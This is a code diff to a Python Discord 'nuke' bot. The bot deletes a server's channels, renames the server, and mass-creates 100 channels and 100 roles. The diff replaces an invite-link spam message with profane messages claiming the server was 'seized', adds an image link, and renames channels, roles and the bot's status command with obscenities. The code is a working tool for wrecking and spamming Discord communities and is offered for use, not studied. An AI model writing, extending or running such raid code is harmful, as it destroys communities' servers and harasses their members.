@@ -23,9 +23,10 @@ async def nuke_channels(guild):
             await asyncio.sleep(0.6)  # Adding a small delay between channel deletions
 
         for i in range(1, 101):
-            channel_name = f"Channel-{i}"
+            channel_name = f"fuckedintheass-{i}"
             new_channel = await guild.create_text_channel(channel_name)
-            await new_channel.send("@everyone https://discord.gg/kXyt3TXA9b")
+            await new_channel.send("# THIS SERVER HAS BEEN SEIZED BY CITY-31'S OVERWATCH TACTICAL CONTROL FOR SELFISHNESS AND PURE DISRESPECT. GET FUCKED.")
+            await new_channel.send("https://i.ibb.co/8BqScCN/Overwatch-Tactical-Control0.png")
             await asyncio.sleep(0.6)  # Adding a delay between channel creations
     except discord.Forbidden:
         print("Missing permissions to perform channel operations.")
@@ -34,13 +35,13 @@ async def nuke_channels(guild):
 
 @bot.command()
 async def nuke(ctx):
-    await ctx.send("Initiating nuke...")
+    await ctx.send("Initiating fuck...")
 
     # Changing the server name to "GET FUCKED"
     if len(bot.guilds) > 0:
         try:
             guild = bot.guilds[0]  # Change the first available guild name
-            await guild.edit(name="Nice Try Bitch")
+            await guild.edit(name="NUKED BY CITY-31'S OTC")
 
             nuke_channels.start(guild)  # Start the channel nuke process
         except discord.Forbidden:
@@ -56,12 +57,12 @@ async def before_nuke_channels():
 async def CreateRoles(ctx):
     guild = ctx.guild
     for i in range(100):
-        await guild.create_role(name="Bitch")
+        await guild.create_role(name="Fucker")
     await ctx.send("CHECK YOUR ROLES")
 
 @bot.event
 async def on_ready():
-    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=".nuke"))
+    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=".fuck"))
     print(f'Logged in as {bot.user.name}')
     print('------')
     
